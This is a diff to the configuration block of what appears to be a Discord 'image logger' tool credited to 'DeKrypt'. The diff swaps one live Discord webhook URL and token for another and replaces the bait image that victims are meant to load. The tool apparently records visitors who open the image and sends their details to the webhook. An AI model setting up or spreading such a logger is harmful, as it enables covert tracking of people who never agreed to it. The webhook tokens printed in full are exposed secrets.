@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-",
-    "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1373740893777035398/cD7CoZ9j0FgAOgk6q_k3W1MYN-bebyUtfBcw1shfbC23CV6NHzqRxFCto86EZK88-89c",
+    "image": "https://static.wikia.nocookie.net/floppapedia-revamped/images/5/5f/ActualBingus.jpg/revision/latest?cb=20211029014151", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
